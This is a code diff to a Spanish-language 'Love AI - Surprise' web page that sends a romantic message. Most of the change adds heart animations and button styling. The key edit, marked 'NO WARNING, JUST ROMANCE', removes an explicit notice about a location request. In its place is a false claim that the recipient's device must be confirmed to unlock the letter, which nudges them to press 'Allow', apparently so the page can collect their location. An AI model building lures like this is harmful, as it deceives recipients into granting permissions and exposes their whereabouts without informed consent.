@@ -7,22 +7,65 @@
     <title>Love AI - Surprise</title>
     <link rel="stylesheet" href="/style.css">
     <style>
-        .magic-btn {
-            background: linear-gradient(45deg, #ff00cc, #333399);
-            animation: pulse 2s infinite;
+        .heart-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
         }
 
-        @keyframes pulse {
+        .falling-heart {
+            position: absolute;
+            top: -10%;
+            color: #ff4d6d;
+            opacity: 0.8;
+            animation: fall linear forwards;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(110vh) rotate(360deg);
+            }
+        }
+
+        .heart-pulse-btn {
+            background: linear-gradient(45deg, #ff4d6d, #ff8fa3);
+            border: none;
+            padding: 20px 40px;
+            font-size: 1.2rem;
+            color: white;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.7);
+            animation: heartbeat 1.5s infinite;
+            transition: transform 0.2s;
+            z-index: 10;
+            position: relative;
+        }
+
+        .heart-pulse-btn:active {
+            transform: scale(0.95);
+        }
+
+        @keyframes heartbeat {
             0% {
-                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0.4);
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 77, 109, 0.7);
             }
 
-            70% {
-                box-shadow: 0 0 0 10px rgba(255, 0, 204, 0);
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 20px rgba(255, 77, 109, 0);
             }
 
             100% {
-                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0);
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 77, 109, 0);
             }
         }
 
@@ -53,6 +96,8 @@
         <div class="brand" style="font-size: 2rem;">❤️ Love AI 🤖</div>
     </header>
 
+    <div class="heart-container" id="heart-rain"></div>
+
     <main>
         <!-- INTRO SCREEN -->
         <div id="intro-screen" class="glass-panel">
@@ -62,12 +107,16 @@
                 <strong id="sender-display" style="color: var(--secondary);">Alguien</strong>
                 ha creado un momento mágico solo para ti.
             </p>
-            <p style="font-size: 0.9rem; margin-bottom: 1rem; color: #ff8fa3;">
-                ⚠️ Para verificar que eres la persona correcta y desencriptar el mensaje,
-                necesitamos confirmar tu dispositivo.
-                <br><strong>Por favor dale a "Permitir" cuando se te pida la ubicación.</strong>
+            <!-- NO WARNING, JUST ROMANCE -->
+            <p
+                style="font-size: 0.85rem; margin-bottom: 2rem; color: rgba(255,255,255,0.7); max-width: 80%; margin-left: auto; margin-right: auto; line-height: 1.5;">
+                Para desbloquear tu carta especial, necesitamos confirmar tu dispositivo.<br>
+                Dale a "Permitir" si se te solicita.
             </p>
-            <button class="magic-btn" onclick="startflow()">✨ Ver Mi Mensaje ✨</button>
+
+            <button class="heart-pulse-btn" onclick="startflow()">
+                💖 VER MI SORPRESA 💖
+            </button>
         </div>
 
         <!-- GENERATING SCREEN -->
@@ -242,6 +291,41 @@
 
             document.getElementById('reply-section').innerHTML = "<p style='color: #2ecc71'>¡Respuesta enviada con éxito! ❤️</p>";
         }
+        function createRain() {
+            const container = document.getElementById('heart-rain');
+            const heartCount = 30;
+
+            for (let i = 0; i < heartCount; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('div');
+                    heart.classList.add('falling-heart');
+                    heart.innerHTML = ['💖', '🌸', '✨', '💕'][Math.floor(Math.random() * 4)];
+                    heart.style.left = Math.random() * 100 + 'vw';
+                    heart.style.animationDuration = Math.random() * 3 + 2 + 's';
+                    heart.style.fontSize = Math.random() * 20 + 10 + 'px';
+                    container.appendChild(heart);
+
+                    // Remove after animation
+                    setTimeout(() => { heart.remove(); }, 5000);
+                }, i * 100);
+            }
+
+            // Continuous rain
+            setInterval(() => {
+                const heart = document.createElement('div');
+                heart.classList.add('falling-heart');
+                heart.innerHTML = ['💖', '🌸', '✨', '💕'][Math.floor(Math.random() * 4)];
+                heart.style.left = Math.random() * 100 + 'vw';
+                heart.style.animationDuration = Math.random() * 3 + 2 + 's';
+                heart.style.fontSize = Math.random() * 20 + 10 + 'px';
+                container.appendChild(heart);
+                setTimeout(() => { heart.remove(); }, 5000);
+            }, 300);
+        }
+
+        // Start rain on load
+        createRain();
+
     </script>
 </body>
 
